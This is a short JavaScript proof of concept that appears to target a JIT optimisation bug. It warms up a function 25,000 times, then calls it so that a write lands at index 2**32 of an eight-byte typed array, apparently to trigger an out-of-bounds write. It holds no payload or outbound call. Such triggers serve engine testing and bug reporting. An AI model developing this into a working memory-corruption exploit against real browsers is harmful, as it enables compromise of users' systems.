function poc(flag) {
    let index = 0;
    const large_index = 2**32;
    const a = new Uint8Array(8);

    for (let i = 0; i < 1; i++) {
        if (flag) {
            index = large_index;
        }
        a[index] = 1;
    }
}

for (let i = 0; i < 25000; i++) {
    poc(false);
}

poc(true);